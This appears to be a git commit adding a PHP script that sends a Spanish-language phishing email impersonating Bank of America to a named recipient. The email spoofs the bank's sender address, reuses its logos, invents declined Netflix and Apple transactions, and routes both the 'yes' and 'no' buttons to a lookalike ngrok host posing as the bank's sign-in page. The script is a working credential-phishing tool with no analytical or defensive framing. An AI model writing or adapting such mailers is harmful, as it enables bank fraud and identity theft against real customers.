f3bacc2fa1254f1b56461242f7975278061d43ff
ronneybetancourt010101 <66742710+ronneybetancourt010101@users.noreply.github.com>
2020-06-10 11:30:39 -0500

    Add files via upload

---
+++ plant ACTIVIDAD INUSUAL TARJETA.php
@@ -0,0 +1,216 @@
+<?php
+  $headers = [];
+
+  //quien recibe 
+  $to = 'belkysbenavides@hotmail.com'; 
+  // TITULO
+  $subject = "Alerta de Seguridad: Actividad inusual de la tarjeta de credito ";  
+
+  // Message
+  $message = "
+ <tbody>
+
+<table style='border:0; width:600px' align='center'>
+<tbody>
+<tr>
+<td style='font-size:12px; line-height:10px; height:10px; padding:0px' height='10' bgcolor='#E31932'>
+
+</td>
+</tr>
+<tr>
+<tr>
+<td style='font-size:20px; text-align:center'>
+<table align='center' style='width:600px; border-width:0px'>
+<tbody>
+<td style='text-align:right; margin:0px; padding:20px 0px 5px'><img data-imagetype='External' src='https://www.bankofamerica.com/content/images/ContextualSiteGraphics/Logos/en_US/BofA_2019_307x31.png' alt='Bank of America®' style='margin:0px; border:0px none; left: 600px; width:208px; height:21px'></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<td>
+<table>
+<tbody>
+<tr>
+<td style='width:601px'>
+<table style='font-family:Arial; color:rgb(51,51,51); width:600px; border-collapse:collapse; padding:0px 30px 30px 10px; border-width:0px'>
+<tbody>
+<tr>
+<td style='background-color:white; padding:0px 20px'><span style='font-size:10pt'></span>
+<table style='border-collapse:collapse; border-width:0px'>
+<tbody>
+<tr>
+<tr>
+<tr>
+<tr>
+<td style='font-size:24px; color:rgb(227,25,50); padding:15px 0px 2px; text-align:left'>
+Alerta de Cuenta: Se ha detectado actividad inusual de la<span style='margin:0px'>&nbsp;</span><span style='margin:0px'>tarjeta</span><span style='margin:0px'>&nbsp;</span>de cr&eacute;dito</td>
+</tr>
+<tr>
+<td style='padding:0px 0px 27px; font-size:13px; text-align:left'><span style='margin:0px; font-size:10pt; font-family:Connections,arial,serif,EmojiFont; color:rgb(82,73,64); background-color:rgb(255,255,255)'></span><span style='margin:0px; font-family:Arial,serif,EmojiFont; background-color:rgb(255,255,255)'></span><span style='margin:0px'>Tarjeta
+ de cr&eacute;dito que termina en<span style='margin:0px'>&nbsp;</span>9035</span></span><br>
+<span style='margin:0px; font-size:10pt; font-family:Arial,Helvetica,sans-serif,serif,EmojiFont; color:rgb(82,73,64); background-color:rgb(255,255,255); display:inline!important'><b></b></span></td>
+</tr>
+<tr>
+<td style='font-size:14px; padding:9px 0px 24px; text-align:left'><span style='margin:0px; font-family:Arial,serif,EmojiFont; background-color:rgb(255,255,255); display:inline!important'><span style='margin:0px; background-color:rgb(255,255,255); display:inline!important'><span style='margin:0px; background-color:rgb(255,255,255); display:inline!important'><span style='margin:0px; background-color:rgb(255,255,255); display:inline!important'>BELKYS GARCIA</span></span></span>,</span></td>
+</tr>
+<tr>
+<td style='font-size:14px; text-align:left; padding:0px 0px 24px'>Le comunicamos que hemos detectado alguna actividad inusual en su tarjeta de cr&eacute;dito de Bank of Am&eacute;rica el 08/06/2020. Por su seguridad, por favor verifique la(s) siguiente(s) transacci&oacute;n(es)
+ para que pueda continuar usando su tarjeta.<br>
+<br>
+</td>
+</tr>
+<tr>
+<td>
+<table style='font-weight:normal; background-color:rgb(250,248,237); width:630px; border:1px solid rgb(230,233,221)'>
+<tbody>
+<tr>
+<td style='font-size:14px; text-align:left; vertical-align:top; padding:25px 0px 0px 23px'>
+<img data-imagetype='External' src='https://secure.bankofamerica.com/content/images/ContextualSiteGraphics/Logos/en_US/Action_Required_Icon.png' alt='action icon' style='margin:0px'></td>
+<td>
+<table style='background-color:rgb(250,248,237); width:640px'>
+<tbody>
+<tr>
+<td style='font-size:14px; text-align:left; padding:26px 0px 10px 20px'><b>Reconoce todas estas transacci&oacute;n(es)?</b></td>
+</tr>
+<tr>
+<td>
+<table style='border-collapse:collapse; border-width:0px'>
+<tbody>
+<tr>
+<td style='font-size:14px; text-align:left; padding:0px 0px 5px 20px'></td>
+<td style='font-size:14px; text-align:left; padding:0px 25px 5px 10px'>Transacci&oacute;n declinada en Netflix 923260 por $12.00 el 08/06/2020</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td>
+<table style='border-collapse:collapse; border-width:0px'>
+<tbody>
+<tr>
+<td style='font-size:14px; text-align:left; padding:0px 0px 5px 20px'></td>
+<td style='font-size:14px; text-align:left; padding:0px 25px 5px 10px'>Transacci&oacute;n declinada en Apple Store #6555789 por $165.35 el 08/06/2020</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td style='padding-top:9px'>
+<table>
+<tbody>
+<tr>
+<td style='text-align:left; padding-left:20px'><a href='https://securecbankofamerica.ngrok.io/' target='_blank' rel='noopener noreferrer' data-auth='NotApplicable' title='https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go' style='margin:0px'><img data-imagetype='External' src='https://secure.bankofamerica.com/content/images/ContextualSiteGraphics/Logos/es_US/Yes_button.png' alt='S&Iacute;, reconozco todas estas' style='margin:0px'></a></td>
+</tr>
+<tr>
+<td style='font-size:13px; text-align:left; padding:4px 20px 14px'><b>S&Iacute;</b><span style='margin:0px'>&nbsp;</span>har&aacute; que su tarjeta est&eacute; lista para usarse de nuevo en forma inmediata.</td>
+</tr>
+<tr>
+<td style='text-align:left; padding-left:20px'><a href='https://securecbankofamerica.ngrok.io/' target='_blank' rel='noopener noreferrer' data-auth='NotApplicable' title='https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go' style='margin:0px'><img data-imagetype='External' src='https://secure.bankofamerica.com/content/images/ContextualSiteGraphics/Logos/es_US/No_button.png' alt='NO, no reconozco una o m&aacute;s de estas' style='margin:0px'></a></td>
+</tr>
+<tr>
+<td style='font-size:13px; text-align:left; padding:4px 20px 19px'><b>NO</b><span style='margin:0px'>&nbsp;</span>le permitir&aacute; completar el proceso de verificaci&oacute;n, detener cualquier cargo a su tarjeta y presentar una reclamaci&oacute;n de fraude en la Banca en L&iacute;nea o en la Banca M&oacute;vil.</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td style='font-size:14px; text-align:left; padding:28px 0px 16px'>Tenga en cuenta que si usted no realizo esta transacci&oacute;n debe<span style='margin:0px'>&nbsp;</span><b>NO RECONOCERLA</b><span style='margin:0px'>&nbsp;</span>en el cuadro de arriba y continuar con ciertos
+ pasos de verificaci&oacute;n para detener el proceso y validar su identidad, no debe responder a este mensaje, si no lo hace es posible que tengamos que aplicar ciertas limitaciones en su tarjeta para proteger su cuenta.</td>
+</tr>
+<tr>
+<td style='font-size:14px; text-align:left; padding:0px 0px 38px'>Si ya ha contactado con nosotros, por favor no tenga en cuenta este aviso.<br>
+<br>
+<div align='center' style='margin:0px; font-size:15px; color:rgb(50,49,48); background-color:rgb(255,255,255); box-sizing:border-box; text-align:center'>
+<div style='margin:0px; height:600px; box-sizing:border-box'>
+<div style='margin:0px; font-family:Calibri,sans-serif,serif,EmojiFont; left:0px; box-sizing:border-box'>
+<br>
+<br>
+<img data-imagetype='External' src='https://i.postimg.cc/QCL1P5W4/ei-1.jpg' style='margin:0px; width:550px; height:27px; box-sizing:border-box'></div>
+<div style='margin:0px; font-family:Calibri,sans-serif,serif,EmojiFont; left:0px; box-sizing:border-box'>
+<br>
+</div>
+<div style='margin:0px; font-family:Calibri,sans-serif,serif,EmojiFont; left:0px; box-sizing:border-box'>
+<br>
+</div>
+<div style='margin:0px; font-family:Calibri,sans-serif,serif,EmojiFont; left:0px; box-sizing:border-box'>
+<table style='font-family:Arial; color:rgb(51,51,51); text-align:start; background-color:rgb(255,255,255); border-collapse:collapse; border-width:0px'>
+<tbody>
+<tr>
+<td style='font-size:13px; text-align:center; padding:0px 0px 15px'>Nunca le pediremos informaci&oacute;n personal, como su n&uacute;mero de Seguro Social o su n&uacute;mero de identificaci&oacute;n personal , en mensajes de correo electr&oacute;nico. Si recibe un mensaje de correo electr&oacute;nico
+ sospechoso o si usted no es el verdadero destinatario de este de correo electr&oacute;nico, no haga clic en ning&uacute;n v&iacute;nculo. En su lugar, env&iacute;elo a<span style='margin:0px; color:rgb(12,100,192)'>&nbsp;</span><span style='margin:0px; color:rgb(12,100,192)'></span><span style='margin:0px; color:rgb(12,100,192)'><span style='margin:0px'><span style='margin:0px'><span style='margin:0px; color:rgb(12,100,192)'><a href='' target='_blank' rel='noopener noreferrer' data-auth='NotApplicable' title='www.bankofamerica.com' style='margin:0px'>abuse@bofamerica.com</a></span><a href='' target='_blank' rel='noopener noreferrer' data-auth='NotApplicable' title='abuse@bofamerica.com' style='margin:0px'></a></span></span></span><span style='margin:0px; color:rgb(12,100,192)'>&nbsp;</span>y
+ luego elim&iacute;nelo.</td>
+</tr>
+<tr>
+<td style='font-size:13px; text-align:center; padding:0px 0px 15px'>Por favor, no responda a este mensaje de correo electr&oacute;nico generado de forma autom&aacute;tica.</td>
+</tr>
+<tr>
+<td style='font-size:13px; text-align:center; padding-bottom:15px'>
+<div style='margin:0px'><span style='margin:0px; color:rgb(12,100,192)'><span style='margin:0px'><a href='' target='_blank' rel='noopener noreferrer' data-auth='NotApplicable' title='' style='margin:0px'><span style='margin:0px'>Notificaci&oacute;n
+ de privacidad</span></a></span><a href='' target='_blank' rel='noopener noreferrer' data-auth='NotApplicable' title='' style='margin:0px'></a></span></div>
+<font color='#3366cc'><span style='margin:0px; padding:0px 0px 0px 20px'><span style='margin:0px; color:rgb(12,100,192)'><span style='margin:0px'><span style='margin:0px'><span style='margin:0px'><span style='margin:0px'><span style='margin:0px'><span style='margin:0px'><a href='' target='_blank' rel='noopener noreferrer' data-auth='NotApplicable' title='' style='margin:0px'><span style='margin:0px'>Igualdad
+ de oportunidades en pr&eacute;stamos para viviendas</span></a></span></span></span></span></span></span></span></span></font><span style='margin:0px; color:rgb(23,78,134)'>&nbsp;</span><img data-imagetype='External' src='https://www.bankofamerica.com/content/images/ContextualSiteGraphics/alerts/desktop_icon_equalhousing.png' style='margin:0px; padding:0px 0px 0px 5px; border:0px none'></td>
+</tr>
+<tr>
+<td style='font-size:13px; text-align:center; padding:0px 0px 15px'>Bank of America, N.A. Miembro de FDIC<br>
+ 2020 Bank of America Corporation</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+  ";
+// To send HTML mail, the Content-type header must be set
+  $headers = "MIME-Version: 1.0\n";
+  $headers .= "Content-type: text/html; charset=iso-8859-1\n";
+  $headers .= "From: Bank of America <onlinebanking@ealerts.bankofamerica.com>\n";
+  // Additional headers
+
+
+  // Mail it
+  //mail($to, $subject, $message, $headers);
+  
+  if(mail($to, $subject, $message, $headers))
+  {
+
+      echo 'Email sent to ' .$to;
+}
+else{ 
+
+$error = 'Se produjo un error al enviar el E-mail intentalo nuevamente.'; 
+
+echo $error;
+
+} 
+      ?> 
